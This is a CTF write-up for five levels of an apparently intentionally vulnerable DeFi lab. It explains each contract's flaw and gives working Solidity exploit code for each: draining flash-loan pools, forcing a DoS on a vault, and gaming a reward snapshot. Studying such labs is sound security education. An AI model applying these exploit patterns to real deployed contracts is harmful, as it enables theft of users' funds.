# Write Ups

<!-- MarkdownTOC levels="1,2" autolink="true" -->

- [01 Unstoppable](#01-unstoppable)
- [02 Naive Receiver](#02-naive-receiver)
- [03 Truster](#03-truster)
- [04 Side Entrance](#04-side-entrance)
- [05 The Rewarder](#05-the-rewarder)

<!-- /MarkdownTOC -->

## 01 Unstoppable

To beat this level, we need to comply with

```solidity
vm.startPrank(someUser);

vm.expectRevert();
receiverContract.executeFlashLoan(100e18);

vm.stopPrank();
```

That is, prevent `someUser` to perform a Flash Loan. In other words, a Denial of Service on the Vault.

NOTE: This user already created an instance of the `ReceiverUnstoppable` contract at the setup.

### Solution

#### Notes on `UnstoppableVault`

* `UnstoppableVault` is an [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) Tokenized Vault, implementing a Flash Loan by [ERC-3156](https://eips.ethereum.org/EIPS/eip-3156).
* Its underlying token is `DVT`, its shares are the `oDVT` token.
* The flash loan lends `DVT`.

#### Notes on the `totalAssets()` implementation

While this analysis doesn't add to the solution, it is worth looking at the assembly code at `totalAssets()`:

```solidity
assembly { // better safe than sorry
    if eq(sload(0), 2) {
        mstore(0x00, 0xed3ba6a6)
        revert(0x1c, 0x04)
    }
}
```

Is a reentrancy control.

* `UnstoppableVault` inherits from `IERC3156FlashLender`, `ReentrancyGuard`, `Owned`, and `ERC4626`.
* While `IERC3156FlashLender` does not have any variable, `ReentrancyGuard` has `uint256 private locked = 1`, therefore, slot 0 will be the value of `locked`, unless the modifier `nonReentrant()` is used.
* This function performs an additional check over this value:
  * It loads slot 0, and compares its value with `2`
  * If slot 0 is equal 2, then it will store in memory position `0x00` the `Reentrant()` function selector `0xed3ba6a6`
  * Then it will revert, with the value `0xed3ba6a6`.
  * To explain why `revert()` uses the `0x1c`, look at the 32 bytes of memory from position `0x00`:
    * `0x00000000000000000000000000000000000000000000000000000000ed3ba6a6`
    * There, it can be noticed that the value starts at position `0x1c`.

#### Notes on `UnstoppableVault.flashLoan()`

Notice the following guard:

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

`convertToShares` will take the given **assets** (underlying token) and compute the amount of **shares**.

As it can be seen that `balanceBefore` is a measure of the **assets** in the vault, then there is a problem of units we can leverage.

#### Leveraging the implementation error

Since `(convertToShares(totalSupply)` is `total shares * (total shares / total assets)`, and this quantity has to be equal to `total assets` (`balanceBefore`), it follows that if we manage to make the total of shares different to the total of assets, we would make the guard fail, preventing flash loans to work.

How do we pertub this ratio? We cannot mint or burn shares without `deposit` or `withdraw`. What we can do instead is incrementing the amount of the underlying asset (`DVT`) in the vault, with a simple `transfer()`.

```solidity
token.transfer(address(level.vault()), 1);
```

By transfering a single `DVT` token, the values checked at the guard will be different, breaking the flash loan.

### References

* https://eips.ethereum.org/EIPS/eip-4626
* https://ethereum.org/es/developers/docs/standards/tokens/erc-4626/
* https://eips.ethereum.org/EIPS/eip-3156

## 02 Naive Receiver

To beat this level, we need to comply with

```solidity
assertEq(address(receiver).balance, 0);
assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
```

In other words: Drain the receiver, putting its funds in the pool.

### Solution

The fees of the pool are notably high

```solidiy
uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
```

And the `flashLoan()` function doesn't control for the caller

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH)
        revert UnsupportedCurrency();

    uint256 balanceBefore = address(this).balance;

    // Transfer ETH and handle control to receiver
    SafeTransferLib.safeTransferETH(address(receiver), amount);
    if(receiver.onFlashLoan(
        msg.sender,
        ETH,
// ....
```

Let's just borrow on behalf of the receiver, then 😈

```solidity
IPool pool = IPool(address(level.pool()));
address receiverAddr = address(level.receiver());

for (uint8 i = 0; i < 10; i++) {
  pool.flashLoan(receiverAddr, level.pool().ETH(), address(pool).balance, "0x");
}
```

### References

* https://eips.ethereum.org/EIPS/eip-3156

## 03 Truster

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
assertEq(token.balanceOf(address(pool)), 0);
```

### Solution

Notice that `TrusterLenderPool.flashLoan` executes any function at _any target_ for you

```solidity
target.functionCall(data);
```

We set an approval to receive all the tokens after we perform a flash loan then

```solidity
// tell the pool in the custom function to approve a transfer to us
bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);
```

One question during the analysis of this problem was "_But then, how do we give the funds back to the loan, while we plant the approval?_". Fortunately,

1. the pool doesn't control for loans of `0` tokens nor charge fees, so we don't need to equip a mechanism to give funds back.
2. ERC20's `transfer` doesn't fail when the `amount` is 0.

We issue the flash loan of 0, and then take the funds.

```solidity
// the pool doesn't control for a loan of 0 tokens, nor charges a fee.
// hence, we don't need to prepare a callback to give it funds back.
pool.flashLoan(
  0,
  address(this),
  address(token),
  data
);

// with our approval planted, we just take the funds
token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
```

### Reference

* https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-

## 04 Side Entrance

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(msg.sender.balance, PLAYER_INITIAL_ETH_BALANCE + ETHER_IN_POOL);
assertEq(address(pool).balance, 0);
```

### Solution

If we make a flash loan, and `deposit()` the funds two things happen:

1. We comply with `(address(this).balance < balanceBefore)`, so the flash loan won't revert.
2. At `deposit()`, This `balances[msg.sender] += msg.value` will execute.

As `withdraw()` only checks the `balances[]` mapping, we will get the amount recorded there.

The solution then is

```solidity
function attack() external {
  // we borrow the funds, the flashLoan() function will
  // call execute() and we deposit() these funds in there,
  // incrementing our balance in the pool.
  pool.flashLoan(1_000 ether);

  // as withdraw() only checks the balances[] mapping,
  // we will get the amount recorded there.
  pool.withdraw();

  // pass the funds to the player
  (bool success,) = msg.sender.call{value: 1_000 ether}("");
  success;
}

function execute() external payable {
  pool.deposit{value: msg.value}();
}
```

Implement `receive() external payable {}` in your contracts.

### References

* https://solidity-by-example.org/hacks/re-entrancy/

## 05 The Rewarder

To beat this level, we need to comply with

```solidity
// Users should get neglegible rewards this round
// ...

// Rewards must have been issued to the player account
// ...

// The amount of rewards earned should be close to total available amount
// ...

// Balance of DVT tokens in player and lending pool hasn't changed
// ...
```

Also, this happens at round 3: `assertEq(rewarderPool.roundNumber(), 3)`.

### Solution

Round number will change at `_recordSnapshot()` (provided the 5 days have passed from last round), and this function only gets triggered at the constructor and `distributeRewards()`.

We can leverage a flash loan of the accounting token to get all the funds we can, deposit them into the pool, trigger `distributeRewards()` to increase the round number, and withdrawing the funds after we get the reward.

```solidity
function attack() public {
  // borrow all the DVT you can get
  // the flow continues at receiveFlashLoan()
  flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

  // give the reward to the player, to beat the level
  rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
}

function receiveFlashLoan(uint256 amount) public {
  // deposit the DVT into the rewarderPool
  liquidityToken.approve(address(rewarderPool), amount);
  rewarderPool.deposit(amount);

  // trigger this to get rewards, and increment the round number
  rewarderPool.distributeRewards();

  // got the rewards, get the DVT back
  rewarderPool.withdraw(amount);

  // pay back the flash loan
  liquidityToken.transfer(msg.sender, amount);
}
```
